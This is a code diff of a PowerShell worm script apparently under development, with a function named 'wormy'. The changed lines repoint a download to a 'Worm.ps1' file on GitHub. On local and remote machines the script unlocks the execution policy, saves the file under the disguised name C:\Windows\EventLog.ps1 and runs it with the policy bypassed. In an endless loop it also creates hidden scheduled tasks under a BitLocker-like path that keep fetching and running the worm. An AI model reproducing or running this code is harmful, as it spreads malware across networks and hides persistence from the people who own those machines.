@@ -112,7 +112,7 @@ function wormy{
                         Invoke-Command -ScriptBlock {
                         set-executionpolicy Unrestricted
                         $WebClient = New-Object System.Net.WebClient
-                        $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\EventLog.ps1")
+                        $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/powW/main/Worm.ps1","C:\Windows\EventLog.ps1")
                         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\EventLog.ps1' -ExecutionPolicy Bypass
                         }
                     }
@@ -120,7 +120,7 @@ function wormy{
                 else{
                         set-executionpolicy Unrestricted -force
                         $WebClient = New-Object System.Net.WebClient
-                        $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\EventLog.ps1")
+                        $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/powW/main/Worm.ps1","C:\Windows\EventLog.ps1")
                         C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\EventLog.ps1' -ExecutionPolicy Bypass   
                 }
                 }
@@ -185,7 +185,7 @@ start-job -ScriptBlock {
     while(1 -eq 1){
         try{ 
 
-            Unregister-ScheduledTask -TaskPath \Microsoft\Windows\Bitlocker -TaskName "EventLog Rotater"  -Confirm:$false 
+            
             $action = @()
             $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/powW/main/Worm.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
             $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "C:\Windows\EventLog.ps1"'
